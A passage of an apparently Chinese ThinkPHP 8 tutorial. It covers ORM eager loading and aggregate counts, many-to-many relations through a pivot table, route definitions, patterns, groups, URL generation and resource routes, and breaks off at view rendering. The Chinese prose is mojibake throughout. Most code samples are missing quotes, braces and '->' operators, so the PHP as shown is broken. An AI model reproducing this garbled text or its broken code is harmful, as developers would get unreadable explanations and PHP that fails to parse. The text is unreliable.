è§£å†³æ–¹æ¡ˆï¼šåœ¨ profile è¡¨ä¸­ è®¾ç½®å¤–é”® åˆ é™¤å’Œä¿®æ”¹æ—¶ ä¸ºï¼šCASCADEå³å¯ï¼Œè¯¦ç»†é˜…è¯»å¦‚ä¸‹ï¼š https://blog.csdn.net/qq_23994787/article/details/86063623 æ¨¡å‹é¢„è½½å…¥å’Œç»Ÿè®¡é¢„è½½å…¥ åœ¨æ™®é€šçš„å…³è”æŸ¥è¯¢ä¸‹ï¼Œæˆ‘ä»¬å¾ªç¯æ•°æ®åˆ—è¡¨ä¼šæ‰§è¡Œ n+1 æ¬¡ SQL æŸ¥è¯¢ï¼› // ä¸»è¡¨ä¸‰æ¡è®°å½•$list = User::select([10, 11, 12]);// éå†é™„è¡¨foreach ($list as $user) dump($user-profile); ä¸Šé¢ç»§ç»­é‡‡ç”¨æ™®é€šå…³è”æŸ¥è¯¢çš„æ„å»ºæ–¹å¼ï¼Œæ‰“å¼€ trace è°ƒè¯•å·¥å…·ï¼Œä¼šå¾—åˆ°å››æ¬¡æŸ¥è¯¢ï¼› å¦‚æœé‡‡ç”¨å…³è”é¢„è½½å…¥çš„æ–¹å¼ï¼Œå°†ä¼šå‡å°‘åˆ°ä¸¤æ¬¡ï¼Œä¹Ÿå°±æ˜¯èµ·æ­¥ä¸€æ¬¡ï¼Œå¾ªç¯ä¸€æ¬¡ï¼› $list = User::with([profile])-select([10, 11, 12, 17, 18, 19]);foreach ($list as $user) dump($user-profile); // æŸ¥çœ‹æ˜¾ç¤ºç»“æ„$list = User::with([profile])-select([1, 10, 22]);return json($list); å…³è”é¢„è½½å…¥å‡å°‘äº†æŸ¥è¯¢æ¬¡æ•°æé«˜äº†æ€§èƒ½ï¼Œä½†æ˜¯ä¸æ”¯æŒå¤šæ¬¡è°ƒç”¨ï¼› å¦‚æœä½ æœ‰ä¸»è¡¨å…³è”äº†å¤šä¸ªé™„è¡¨ï¼Œéƒ½æƒ³è¦è¿›è¡Œé¢„è½½å…¥ï¼Œå¯ä»¥ä¼ å…¥å¤šä¸ªæ¨¡å‹æ–¹æ³•å³å¯ï¼› User::with([profile, book]) ä¸Šé¢æ˜¾ç¤ºç»“æ„ä¸­ï¼Œä¸»è¡¨å’Œé™„è¡¨çš„å­—æ®µå·²ç»éå¸¸å¤šäº†ï¼Œéœ€è¦å¯¹ä¸¤ä¸ªè¡¨å­—æ®µè¿›è¡Œç­›ç•¥ï¼š // æ³¨æ„1ï¼šwithFieldå¯¹åº”å¦ä¸€ä¸ªæ˜¯withoutField// æ³¨æ„2ï¼šå…³è”å­—æ®µä¸€å®šè¦åŒ…å«å¤–é”®ï¼šuser_idï¼Œå¦åˆ™ç©º$list = User::field(id,age,gender,details)-with([profile = function($query) $query-withField([user_id, hobby]);])-select([1, 10, 22]);return json($list);// æˆ–è€…ç®€å•äº›$list = User::with(profile)-select();// ç›´æ¥å­—æ®µï¼Œéšè—ä¸»è¡¨ï¼ŒåŠ ä¸Šprofileéšè—é™„è¡¨ï¼Œé™¤äº†hiddenï¼Œè¿˜æœ‰å¯¹åº”çš„visibleæ–¹æ³•return json($list-hidden([status, profile.visible])); è¿˜æœ‰ä¸€äº› é¢„è½½å…¥ç¼“å­˜ã€å»¶è¿Ÿé¢„è½½å…¥ï¼Œå¯ä»¥å‚è€ƒæ‰‹å†Œï¼› å…³è”ç»Ÿè®¡ ä½¿ç”¨ withCount()æ–¹æ³•ï¼Œå¯ä»¥ç»Ÿè®¡ä¸»è¡¨å…³è”é™„è¡¨çš„ä¸ªæ•°ï¼Œè¾“å‡ºç”¨ profile_countï¼› // ç»Ÿè®¡è¿™ä¸‰æ¡æ•°æ®å…³è”çš„é™„è¡¨æ•°æ®çš„ä¸ªæ•°$list = User::withCount([profile])-select([1, 10, 22]);foreach ($list as $user) echo $user-profile_count.br; å…³è”ç»Ÿè®¡çš„è¾“å‡ºé‡‡ç”¨â€œå…³è”æ–¹æ³•åâ€ _countï¼Œè¿™ç§ç»“æ„è¾“å‡ºï¼› ä¸å•å•æ”¯æŒ Countï¼Œè¿˜æœ‰å¦‚ä¸‹ç»Ÿè®¡æ–¹æ³•ï¼Œå‡å¯æ”¯æŒï¼› **withMax()ã€withMin()ã€withSum()ã€withAvg()**ç­‰ï¼› é™¤äº† withCount()ä¸éœ€è¦æŒ‡å®šå­—æ®µï¼Œå…¶å®ƒå‡éœ€è¦æŒ‡å®šç»Ÿè®¡å­—æ®µï¼› // ç»Ÿè®¡é™„è¡¨å…³è”å­—æ®µçš„ç´¯åŠ å’Œ$list = User::withSum([profile], visible)-select([1, 10, 22]);foreach ($list as $user) echo $user-profile_sum.br; å¯¹äºè¾“å‡ºçš„å±æ€§ï¼Œå¯ä»¥è‡ªå®šä¹‰ï¼š User::withSum([profile=p_s], visible)$user-p_s å¤šå¯¹å¤šå…³è”æŸ¥è¯¢å»ºç«‹ä¸‰å¼ è¡¨ å¤ä¹ ä¸€ä¸‹ä¸€å¯¹ä¸€ï¼Œä¸€ä¸ªç”¨æˆ·å¯¹åº”ä¸€ä¸ªç”¨æˆ·æ¡£æ¡ˆèµ„æ–™ï¼Œæ˜¯ä¸€å¯¹ä¸€å…³è”ï¼› å¤ä¹ ä¸€ä¸‹ä¸€å¯¹å¤šï¼Œä¸€ç¯‡æ–‡ç« å¯¹åº”å¤šä¸ªè¯„è®ºï¼Œæ˜¯ä¸€å¯¹å¤šå…³è”ï¼› å¤šå¯¹å¤šæ€ä¹ˆç†è§£ï¼Œåˆ†è§£æ¥çœ‹ï¼Œä¸€ä¸ªç”¨æˆ·å¯¹åº”å¤šä¸ªè§’è‰²ï¼Œè€Œä¸€ä¸ªè§’è‰²å¯¹åº”å¤šä¸ªç”¨æˆ·ï¼› é‚£ä¹ˆè¿™ç§å¯¹åº”å…³ç³»ï¼Œå°±æ˜¯å¤šå¯¹å¤šå…³ç³»ï¼Œæœ€ç»å…¸çš„åº”ç”¨å°±æ˜¯æƒé™æ§åˆ¶ï¼› tp_userï¼šç”¨æˆ·è¡¨ï¼›tp_roleï¼šè§’è‰²è¡¨ï¼›tp_accessï¼šä¸­é—´è¡¨ï¼› access è¡¨åŒ…å«äº† user å’Œ role è¡¨çš„å…³è” idï¼Œå¤šå¯¹å¤šæ¨¡å¼ï¼› class User extends Model public function role() // belongsToMany(å…³è”æ¨¡å‹,ä¸­é—´è¡¨,[å¤–é”®,å…³è”é”®]); return $this-belongsToMany(Role::class, Access::class); class Role extends Model // è¿™é‡Œç»§æ‰¿çš„æ˜¯Pivotï¼Œå®ƒæœ¬èº«ä¹Ÿç»§æ‰¿äº†Model// Pivoitæ˜¯ä¸­é—´è¡¨åŸºç±»ï¼Œå¤šå¯¹å¤šä¸“ç”¨æ¨¡å‹class Access extends Pivot æƒé™æ§åˆ¶ åœ¨æ§åˆ¶å™¨æ®µï¼Œæˆ‘ä»¬æŸ¥è¯¢ä¸€ä¸‹idä¸º1çš„ç”¨æˆ·ï¼Œå¹¶å…³è”æŸ¥è¯¢å®ƒçš„æƒé™ï¼š // è·å–ä¸€ä¸ªç”¨æˆ·ï¼Œå¼ ä¸‰$user = User::find(1);// è·å–è¿™ä¸ªç”¨æˆ·æ‰€æœ‰è§’è‰²$role = $user-role;return json($role); å½“æˆ‘ä»¬è¦ç»™ä¸€ä¸ªç”¨æˆ·åˆ›å»ºä¸€ä¸ªè§’è‰²æ—¶ï¼Œç”¨åˆ°å¤šå¯¹å¤šå…³è”æ–°å¢ï¼› // å¦‚æœè¿™ä¸ªè§’è‰²ä¸å­˜åœ¨ï¼Œåˆ™ä¼šç»™è§’è‰²è¡¨å¢åŠ ä¸€æ¡ä¿¡æ¯// å¹¶ä¸”ï¼Œä¼šåœ¨ä¸­é—´è¡¨å…³è”è§’è‰²å’Œç”¨æˆ·$user-role()-save([type=æµ‹è¯•ç®¡ç†ä¸“å‘˜]);// ä¹Ÿæ”¯æŒæ‰¹é‡$user-role()-saveAll([[...],[...]]); ä¸€èˆ¬æ¥è¯´ï¼Œä¸Šé¢çš„è¿™ç§æ–°å¢æ–¹å¼ï¼Œç”¨äºåˆå§‹åŒ–è§’è‰²æ¯”è¾ƒåˆé€‚ï¼› ä½†æ˜¯ï¼Œå¾ˆå¤šæƒ…å†µä¸‹ï¼Œè§’è‰²æƒé™æ˜¯åˆå§‹åŒ–å¥½çš„ï¼Œåªéœ€è¦æ·»åŠ ä¸­é—´è¡¨ï¼Œè€Œä¸æ˜¯è§’è‰²è¡¨ï¼› é‚£ä¹ˆï¼Œæˆ‘ä»¬çœŸæ­£éœ€è¦å°±æ˜¯é€šè¿‡ç”¨æˆ·è¡¨æ–°å¢åˆ°ä¸­é—´è¡¨å…³è”å³å¯ï¼› // ç»™å¼ ä¸‰æ·»åŠ ä¸€ä¸ªå·²ç»å­˜åœ¨çš„è§’è‰²ï¼Œç›´æ¥ä¼ è§’è‰²IDå³å¯$user-role()-save(1);// æˆ–$user-role()-save(Role::find(1));$user-role()-saveAll([1,2,3]); // æˆ–ï¼Œå¦‚æœæœ‰å…¶å®ƒå­—æ®µï¼Œå¯ä»¥é€šè¿‡ä¸­æ‹¬å·æ·»åŠ $user-role()-attach(1);$user-role()-attach(2, [details=æµ‹è¯•è¯¦æƒ…]); é™¤äº†æ–°å¢ï¼Œè¿˜æœ‰ç›´æ¥åˆ é™¤ä¸­é—´è¡¨æ•°æ®çš„æ–¹æ³•ï¼š // å–æ¶ˆæ‰å¼ ä¸‰çš„æ‰€æœ‰ï¼Œ1ï¼Œ2ï¼Œ6ï¼Œè¿™é‡Œçš„å€¼æ˜¯è§’è‰²çš„IDï¼Œä¸æ˜¯ä¸­é—´è¡¨ID$user-role()-detach(1);$user-role()-detach([2, 6]); è·¯ç”±å®šä¹‰è·¯ç”±å…¥é—¨ è·¯ç”±çš„ä½œç”¨å°±æ˜¯è®© URL åœ°å€æ›´åŠ çš„è§„èŒƒå’Œä¼˜é›…ï¼Œæˆ–è€…è¯´æ›´åŠ ç®€æ´ï¼› è®¾ç½®è·¯ç”±å¯¹ URL çš„æ£€æµ‹ã€éªŒè¯ç­‰ä¸€ç³»åˆ—æ“ä½œæä¾›äº†æå¤§çš„ä¾¿åˆ©æ€§ï¼› è·¯ç”±æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œå¦‚æœæƒ³è¦å…³é—­è·¯ç”±ï¼Œåœ¨ configapp.php é…ç½®ï¼› // æ˜¯å¦å¯ç”¨è·¯ç”±with_route = true, è·¯ç”±çš„é…ç½®æ–‡ä»¶åœ¨ configroute.php ä¸­ï¼Œå®šä¹‰æ–‡ä»¶åœ¨ routeapp.phpï¼› æˆ‘ä»¬è¿˜å›åˆ°æœ€åˆçš„ Index æ§åˆ¶å™¨ï¼Œåˆ›å»ºä¸€ä¸ª details å¸¦ å‚æ•°çš„æ–¹æ³•ï¼› public function details($id) return details IDï¼š.$id; http://www.tp.com:8000/index/details/id/5 æ­¤æ—¶ï¼Œæˆ‘ä»¬åœ¨æ ¹ç›®å½• route ä¸‹çš„ app.php é‡Œé…ç½®è·¯ç”±ï¼š // å‚æ•°1ï¼šurl/å‚æ•°// å‚æ•°2ï¼šæ§åˆ¶å™¨/æ–¹æ³•Route::rule(details/:id, Index/details);// è®¿é—®åœ°å€http://www.tp.com:8000/details/5 rule()æ–¹æ³•æ˜¯é»˜è®¤è¯·æ±‚æ˜¯ anyï¼Œå³ä»»ä½•è¯·æ±‚ç±»å‹å‡å¯ï¼Œç¬¬ä¸‰å‚æ•°å¯ä»¥é™åˆ¶ï¼š Route::rule(details/:id, Index/xxx, GET);Route::rule(details/:id, Index/xxx, POST);Route::rule(details/:id, Index/xxx, GET|POST); æ‰€æœ‰çš„è¯·æ±‚æ–¹å¼å‡æœ‰å¿«æ·æ–¹å¼ï¼Œæ¯”å¦‚ ::get() ã€**::post()** ç­‰ï¼Œå…·ä½“æŸ¥çœ‹æ‰‹å†Œï¼šè·¯ç”± - è·¯ç”±å®šä¹‰ï¼› // å¿«æ·æ–¹å¼ï¼Œæ— é¡»ç¬¬ä¸‰å‚æ•°äº†Route::get(...)Route::post(...)Route::delete(...) åœ¨è·¯ç”±çš„è§„åˆ™è¡¨è¾¾å¼ä¸­ï¼Œæœ‰å¤šç§åœ°å€çš„é…ç½®è§„åˆ™ï¼š // é™æ€è·¯ç”±Route::rule(test, Index/test);// å¸¦ä¸€ä¸ªå‚æ•°Route::rule(details/:id, Index/details);// å¸¦ä¸¤ä¸ªå‚æ•°Route::rule(details/:id/:uid, Index/details);// å¸¦å¯é€‰å‚æ•°ï¼Œä¸€èˆ¬åœ¨åé¢Route::rule(details/:id/[:uid], Index/details);// å…¨åŠ¨æ€åœ°å€ï¼Œä¸é™å®šdetailsï¼Œurlå¯ä»¥æ˜¯ï¼šabc/5/6ï¼Œåé¢detailsä¹Ÿå¯ä»¥åŠ¨æ€Route::rule(:details/:id/:uid, Index/details);// æ­£åˆ™è§„åˆ™ï¼Œå®Œå…¨åŒ¹é…Route::rule(details/:id/:uid$, Index/details); å¼ºåˆ¶è·¯ç”± ç›®å‰æ¥è¯´ï¼Œè·¯ç”±è®¿é—®æ¨¡å¼å’ŒURLè®¿é—®æ¨¡å¼éƒ½å¯ä»¥ä½¿ç”¨ï¼Œä½†æˆ‘ä»¬å¼ºåˆ¶è·¯ç”±è®¿é—®ï¼› å¼€å§‹å¼ºåˆ¶è·¯ç”±ï¼Œéœ€è¦åœ¨ route.php é‡Œé¢è¿›è¡Œé…ç½®ï¼š // æ˜¯å¦å¼ºåˆ¶ä½¿ç”¨è·¯ç”±url_route_must = true, // é¦–é¡µä¹Ÿå¿…é¡»è®¾ç½®è·¯ç”±Route::rule(/, Index/index); å®Œå…¨åŒ¹é…è§„åˆ™åŒ¹é…æ£€æµ‹çš„æ—¶å€™é»˜è®¤åªæ˜¯å¯¹URLä»å¤´å¼€å§‹åŒ¹é…ï¼Œåªè¦URLåœ°å€å¼€å¤´åŒ…å«äº†å®šä¹‰çš„è·¯ç”±è§„åˆ™å°±ä¼šåŒ¹é…æˆåŠŸï¼Œå¦‚æœå¸Œæœ›URLè¿›è¡Œå®Œå…¨åŒ¹é…ï¼Œå¯ä»¥åœ¨è·¯ç”±è¡¨è¾¾å¼æœ€åä½¿ç”¨$ç¬¦å·ï¼Œä¾‹å¦‚ï¼š Route::get(new/:cate$, News/category); è¿™æ ·å®šä¹‰å http://serverName/index.php/new/info ä¼šåŒ¹é…æˆåŠŸ,è€Œ http://serverName/index.php/new/info/2 åˆ™ä¸ä¼šåŒ¹é…æˆåŠŸã€‚ å¦‚æœæ˜¯é‡‡ç”¨ Route::get(new/:cate, News/category); æ–¹å¼å®šä¹‰çš„è¯ï¼Œåˆ™ä¸¤ç§æ–¹å¼çš„URLè®¿é—®éƒ½å¯ä»¥åŒ¹é…æˆåŠŸã€‚ å¦‚æœéœ€è¦å…¨å±€è¿›è¡ŒURLå®Œå…¨åŒ¹é…ï¼Œå¯ä»¥åœ¨è·¯ç”±é…ç½®æ–‡ä»¶ä¸­è®¾ç½® // å¼€å¯è·¯ç”±å®Œå…¨åŒ¹é…route_complete_match = true, å¼€å¯å…¨å±€å®Œå…¨åŒ¹é…åï¼Œå¦‚æœéœ€è¦å¯¹æŸä¸ªè·¯ç”±å…³é—­å®Œå…¨åŒ¹é…ï¼Œå¯ä»¥ä½¿ç”¨ Route::get(new/:cate, News/category)-completeMatch(false); è·¯ç”±é—­åŒ…å’Œå˜é‡è§„åˆ™é—­åŒ… é—­åŒ…æ”¯æŒæˆ‘ä»¬å¯ä»¥é€šè¿‡ URL ç›´æ¥æ‰§è¡Œï¼Œè€Œä¸éœ€è¦é€šè¿‡æ§åˆ¶å™¨å’Œæ–¹æ³•ï¼› // é—­åŒ…Route::get(think, function () return hello, ThinkPHP8!;); é—­åŒ…æ”¯æŒä¹Ÿå¯ä»¥ä¼ é€’å‚æ•°å’ŒåŠ¨æ€è§„åˆ™ï¼š // å¸¦å‚æ•°é—­åŒ…ï¼Œå¦‚æœä¸å¸¦:versionï¼Œé‚£ä¹ˆåœ°å€ï¼šphp?version=8Route::get(php/:version, function ($version) return PHP.$version;); å˜é‡è§„åˆ™ ç³»ç»Ÿé»˜è®¤çš„è·¯ç”±å˜é‡è§„åˆ™ä¸º\\w+ï¼Œå³å­—æ¯ã€æ•°å­—ã€ä¸­æ–‡å’Œä¸‹åˆ’çº¿ï¼› å¦‚æœä½ æƒ³æ›´æ”¹é»˜è®¤çš„åŒ¹é…è§„åˆ™ï¼Œå¯ä»¥ä¿®æ”¹ configroute.php é…ç½®ï¼› // é»˜è®¤çš„è·¯ç”±å˜é‡è§„åˆ™default_route_pattern = [\\w\\.]+, å¦‚æœæˆ‘ä»¬éœ€è¦å¯¹äºå…·ä½“çš„å˜é‡è¿›è¡Œå•ç‹¬çš„è§„åˆ™è®¾ç½®ï¼Œåˆ™éœ€è¦é€šè¿‡ pattern() æ–¹æ³•ï¼› å°† details æ–¹æ³•é‡Œçš„ id ä¼ å€¼ï¼Œä¸¥æ ¼é™åˆ¶å¿…é¡»åªèƒ½æ˜¯æ•°å­—\\d+ï¼› // æ­£åˆ™è§„åˆ™ \\d+ é™å®šidä¸ºæ•°å­—Route::rule(details/:id, Index/details) -pattern([id=\\d+]);// å¤šä¸ªå‚æ•°-pattern([ id = \\d+, uid = \\d+]); å¦‚æœè®©æŒ‡å®šçš„å‚æ•°ç»Ÿä¸€é™å®šä¸ºæ•°å­—ï¼Œæ¯”å¦‚idå’Œuidï¼Œä¹Ÿå°±æ˜¯å…¨å±€è®¾ç½®ï¼Œåœ¨app.phpé¡¶éƒ¨è®¾ç½®ï¼š Route::pattern([ id = \\d+, uid = \\d+]); ä¸å–œæ¬¢æ–œæ æ€ä¹ˆåŠï¼Ÿèƒ½æ¢æˆå‡å·å—ï¼Ÿå¯ä»¥çš„ï¼š // æ”¯æŒæ›¿æ¢æ–œæ Route::rule(details-:id, Index/details); // æ”¯æŒç»„åˆå˜é‡idæ–¹å¼Route::rule(details-id, Index/details); è·¯ç”±å‚æ•°.åŸŸå.MISSå‚æ•° è®¾ç½®è·¯ç”±çš„æ—¶å€™ï¼Œå¯ä»¥è®¾ç½®ç›¸å…³æ–¹æ³•è¿›è¡Œï¼Œä»è€Œå®æ–½åŒ¹é…æ£€æµ‹å’Œè¡Œä¸ºæ‰§è¡Œï¼› ext æ–¹æ³•ä½œç”¨æ˜¯æ£€æµ‹ URL åç¼€ï¼Œæ¯”å¦‚ï¼šæˆ‘ä»¬å¼ºåˆ¶æ‰€æœ‰ URL åç¼€ä¸º.htmlï¼› Route::rule(test, Index/test)-ext(html);Route::rule(test, Index/test)-ext(html|shtml); https æ–¹æ³•ä½œç”¨æ˜¯æ£€æµ‹æ˜¯å¦ä¸º https è¯·æ±‚ï¼Œç»“åˆ ext å¼ºåˆ¶ html å¦‚ä¸‹ï¼š Route::rule(test, Index/test)-ext(html)-https(); å¦‚æœæƒ³è®©å…¨å±€ç»Ÿä¸€é…ç½® URL åç¼€çš„è¯ï¼Œå¯ä»¥åœ¨ configroute.php ä¸­è®¾ç½®ï¼› å…·ä½“å€¼å¯ä»¥æ˜¯å•ä¸ªæˆ–å¤šä¸ªåç¼€ï¼Œä¹Ÿå¯ä»¥æ˜¯ç©ºå­—ç¬¦ä¸²(ä»»æ„åç¼€)ï¼Œfalse ç¦æ­¢åç¼€ï¼› // URLä¼ªé™æ€åç¼€url_html_suffix = html, denyExt æ–¹æ³•ä½œç”¨æ˜¯ç¦æ­¢æŸäº›åç¼€çš„ä½¿ç”¨ï¼Œä½¿ç”¨åç›´æ¥æŠ¥é”™ï¼› // å¯ä»¥å°†url_html_suffix è®¾ç½®ä¸ºç©ºæµ‹è¯•Route::rule(test, Index/test)-denyExt(jpg|gif|png); domain æ–¹æ³•ä½œç”¨æ˜¯æ£€æµ‹å½“å‰çš„åŸŸåæ˜¯å¦åŒ¹é…ï¼Œå®Œæ•´åŸŸåå’Œå­åŸŸåå‡å¯ï¼› Route::rule(test, Index/test)-domain(localhost);Route::rule(test, Index/test)-domain(new.tp.com);Route::rule(test, Index/test)-domain(new); è¿˜æœ‰ajaxpjaxjsonæ£€æµ‹ã€filter é¢å¤–å‚æ•°æ£€æµ‹ã€appendè¿½åŠ é¢å¤–å‚æ•°ã€optionç»Ÿä¸€ç®¡ç†æ£€æµ‹ï¼Œå¯å‚è€ƒæ‰‹å†Œï¼› Route::rule(test, Index/test)-option([ ext = html, https = false, domain = www.tp.com]); åŸŸå å¦‚æœæƒ³é™å®šçš„æŸä¸ªåŸŸåä¸‹ç”Ÿæ•ˆçš„è·¯ç”±ï¼Œæ¯”å¦‚ news.tp.com å¯ä»¥é€šè¿‡åŸŸåé—­åŒ…æ–¹å¼ï¼š Route::domain(news.tp.com, function () Route::rule(details/:id, Index/details););// æˆ–Route::domain(news, function () Route::rule(details/:id, Index/details);); è·¯ç”±åŸŸåä¹Ÿæ”¯æŒï¼šextã€patternã€append ç­‰è·¯ç”±å‚æ•°æ–¹æ³•çš„æ“ä½œï¼› MISS å…¨å±€ MISS,ç±»ä¼¼å¼€å¯å¼ºåˆ¶è·¯ç”±åŠŸèƒ½ï¼ŒåŒ¹é…ä¸åˆ°ç›¸åº”è§„åˆ™æ—¶è‡ªåŠ¨è·³è½¬åˆ° MISSï¼› Route::miss(Error/miss);// é—­åŒ…æ¨¡å¼Route::miss(function () return MISS 404;); è·¯ç”±åˆ†ç»„.URLç”Ÿæˆåˆ†ç»„ è·¯ç”±åˆ†ç»„ï¼Œå³å°†ç›¸åŒå‰ç¼€çš„è·¯ç”±åˆå¹¶åˆ†ç»„ï¼Œè¿™æ ·å¯ä»¥ç®€åŒ–è·¯ç”±å®šä¹‰ï¼Œæé«˜åŒ¹é…æ•ˆç‡ï¼› ä½¿ç”¨ group()æ–¹æ³•ï¼Œæ¥è¿›è¡Œåˆ†ç»„è·¯ç”±çš„æ³¨å†Œï¼› Route::group(index, function () Route::rule(:id, Index/details); Route::rule(:name, Index/hello);)-ext(html)-pattern([id=\\d+]);// URL1: http://www.tp.com:8000/index/5.html// URL2: http://www.tp.com:8000/index/world.html ä¹Ÿå¯ä»¥çœå»ç¬¬ä¸€å‚æ•°ï¼Œè®©åˆ†ç»„è·¯ç”±æ›´çµæ´»ä¸€äº›ï¼› Route::group(function() Route::rule(test, Index/test); Route::rule(h/:name, Index/hello);)-ext(html);// URL1: http://www.tp.com:8000/test.html// URL2: http://www.tp.com:8000/h/world.html ä½¿ç”¨ prefix()æ–¹æ³•ï¼Œå¯ä»¥çœç•¥æ‰åˆ†ç»„åœ°å€é‡Œçš„æ§åˆ¶å™¨ï¼› Route::group(index, function () Route::rule(test, test); Route::rule(:name, hello);)-prefix(Index/)-ext(html);// URL1: http://www.tp.com:8000/index/test.html// URL2: http://www.tp.com:8000/index/world.html URLç”Ÿæˆ ä½¿ç”¨ url() åŠ©æ‰‹å‡½æ•°æ¥ç”Ÿæˆå®šä¹‰å¥½çš„è·¯ç”±åœ°å€ï¼Œæ”¾åœ¨åœ¨æ§åˆ¶å™¨ä½¿ç”¨ï¼› // é™æ€ä¸å¸¦å‚æ•°çš„Route::rule(test, Index/test)-ext(html);// æ§åˆ¶å™¨æ®µè·å–urlï¼š/test.htmlreturn url(Index/test);// åŠ¨æ€å¸¦å‚æ•°çš„Route::rule(details/:id, Index/details)-ext(html);// æ§åˆ¶å™¨æ®µè·å–urlï¼š/details/5.htmlreturn url(Index/details, [id=5]);// urlå‚æ•°ä¸€å’Œè·¯ç”±çš„ruleçš„å‚æ•°äºŒæ˜¯ä¸€è‡´çš„ï¼Œå¯ä»¥é€šè¿‡nameæ–¹æ³•å¤åˆ»ï¼›Route::rule(details/:id, Index/details)-name(de)-ext(html);// æ§åˆ¶å™¨æ®µè·å–urlï¼š/details/5.htmlreturn url(de, [id=5]);// å®Œæ•´å¸¦åŸŸåçš„åœ°å€ï¼šhttp://www.tp.com:8000/details/5.htmlreturn url(de, [id=5])-domain(true);return url(de, [id=5])-domain(www.tp.com); åœ¨æ‰‹å†Œ - è·¯ç”± - URL ç”Ÿæˆ æœ‰ Route::buildUrl() æºæ–¹æ³•ï¼Œåªä¸è¿‡åŠ©æ‰‹å‡½æ•°ï¼Œæ›´æ–¹ä¾¿ï¼› èµ„æºè·¯ç”±åˆ›å»ºèµ„æº èµ„æºè·¯ç”±ï¼Œé‡‡ç”¨å›ºå®šçš„å¸¸ç”¨æ–¹æ³•æ¥å®ç°ç®€åŒ– URL çš„åŠŸèƒ½ï¼› Route::resource(blog, Blog); ç³»ç»Ÿæä¾›äº†ä¸€ä¸ªå‘½ä»¤ï¼Œæ–¹ä¾¿å¼€å‘è€…å¿«é€Ÿç”Ÿæˆä¸€ä¸ªèµ„æºæ§åˆ¶å™¨ï¼› php think make:controller Blog ä»¥ä¸Šçš„ä¸¤éƒ¨æ“ä½œï¼Œåˆ›å»ºäº†ä¸€ä¸ªæ§åˆ¶å™¨Blogç±»ï¼Œå¹¶ç”Ÿæˆäº†å¢åˆ æ”¹æŸ¥æ“ä½œçš„æ–¹æ³•ï¼Œè€Œä¸”è¿˜å®ç°äº†å…¨éƒ¨è·¯ç”±ï¼š æ ‡è¯† è¯·æ±‚ç±»å‹ è·¯ç”±è§„åˆ™ æ“ä½œæ–¹æ³• index GET blog index create GET blogcreate create save POST blog save read GET blog:id read edit GET blog:idedit edit update PUT blog:id update delete DELETE blog:id delete åœ°å€URL èµ„æºè·¯ç”±æ³¨å†Œå¥½åï¼Œæ‰€æœ‰åœ°å€éƒ½æ˜¯å…¨è‡ªåŠ¨ç”Ÿæˆï¼Œå…·ä½“å¦‚ä¸‹ï¼š http://www.tp.com:8000/blog //GET è®¿é—®çš„æ˜¯indexæ–¹æ³•ï¼Œç”¨äºæ˜¾ç¤ºæ•°æ®http://www.tp.com:8000/blog/create //GET è®¿é—®çš„æ˜¯createæ–¹æ³•ï¼Œæ–°å¢æ•°æ®çš„è¡¨å•é¡µé¢http://www.tp.com:8000/blog/5 //GET è®¿é—®çš„æ˜¯readæ–¹æ³•ï¼Œè¯»å–æŒ‡å®šidçš„ä¸€æ¡æ•°æ®http://www.tp.com:8000/blog/5/edit //GET è®¿é—®çš„æ˜¯editæ–¹æ³•ï¼Œè¯»å–æŒ‡å®šidæ•°æ®å¹¶æ˜¾ç¤ºä¿®æ”¹è¡¨å• http://www.tp.com:8000/blog //POST è®¿é—®çš„æ˜¯saveæ–¹æ³•ï¼Œç”¨äºæ¥æ”¶è¡¨å•æäº¤çš„æ–°å¢æ•°æ®http://www.tp.com:8000/blog/5 //PUT è®¿é—®çš„æ˜¯updateæ–¹æ³•ï¼Œç”¨äºæ¥æ”¶è¡¨å•æäº¤çš„ä¿®æ”¹æ•°æ®http://www.tp.com:8000/blog/5 //DELETE è®¿é—®çš„æ˜¯deleteæ–¹æ³•ï¼Œç”¨äºæ¥æ”¶æ•°æ®åˆ é™¤ä¿¡æ¯ é»˜è®¤çš„å‚æ•°é‡‡ç”¨ id åç§°ï¼Œå¦‚æœä½ æƒ³åˆ«çš„ï¼Œæ¯”å¦‚ï¼šblog_idï¼› //ç›¸åº”çš„ delete($blog_id)...-vars([blog=blog_id]); ä¹Ÿå¯ä»¥é€šè¿‡ only() æ–¹æ³•é™å®šç³»ç»Ÿæä¾›çš„èµ„æºæ–¹æ³•ï¼š // åªå…è®¸æŒ‡å®šçš„è¿™äº›æ“ä½œ...-only([index,save,create]); è¿˜å¯ä»¥é€šè¿‡ except() æ–¹æ³•æ’é™¤ç³»ç»Ÿæä¾›çš„èµ„æºæ–¹æ³•ï¼š // onlyç›¸åæ“ä½œ...-except([read,delete,update]) ä½¿ç”¨ rest() æ–¹æ³•ï¼Œæ›´æ”¹ç³»ç»Ÿç»™äºˆçš„é»˜è®¤æ–¹æ³•ï¼Œ1.è¯·æ±‚æ–¹å¼ï¼›2.åœ°å€ï¼›3.æ“ä½œï¼› Route::rest(create, [GET, /add, add]);// æ‰¹é‡Route::rest([ save = [POST, , store], update = [PUT, /:id, save], delete = [DELETE, /:id, destory],]); æ”¯æŒåµŒå¥—èµ„æºè·¯ç”±ï¼Œç±»ä¼¼äºä¸€å¯¹å¤šå…³è”çš„æ„Ÿè§‰ï¼Œå®æˆ˜ä¸­ç”¨åˆ°å†æ“ä½œï¼Œè¯¦æƒ…æŸ¥çœ‹æ‰‹å†Œï¼š è§†å›¾.å˜é‡,æ¸²æŸ“è§†å›¾æ“ä½œ é¦–å…ˆï¼Œä¸ºäº†æ–¹ä¾¿åç»­è¯¾ç¨‹å­¦ä¹ ï¼Œå…ˆæŠŠè·¯ç”±ç»™å…³é—­äº†ï¼›å¹¶åˆ›å»ºä¸€ä¸ªç”¨äºæµ‹è¯•è§†å›¾çš„æ§åˆ¶å™¨ï¼š // æ˜¯å¦å¯ç”¨è·¯ç”±with_route = false,// è§†å›¾æ§åˆ¶å™¨class ViewPage extends BaseController public function index() return view; ç”±äºæˆ‘ä»¬ä¸ç”¨æ¨¡æ¿å¼•æ“ï¼Œç›´æ¥ä½¿ç”¨phpåŸç”Ÿï¼Œå°±éœ€è¦ä½¿ç”¨ engine() æ–¹æ³•ï¼Œè½½å…¥ test æ¨¡æ¿ï¼› // è½½å…¥åŸç”Ÿphpæ¨¡æ¿return View::engine(php)-fetch(test);// æ¨¡æ¿åœ°å€ä¸ºï¼šview/view_page/test.html// æˆ–ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå°†Thinkæ”¹ä¸ºphpå°±å¯ä»¥ä½¿ç”¨åŠ©æ‰‹å‡½æ•°return view(test); å¦‚æœå¸Œæœ›æ¨¡æ¿åç¼€ä¸º .phpï¼Œæ–¹ä¾¿ 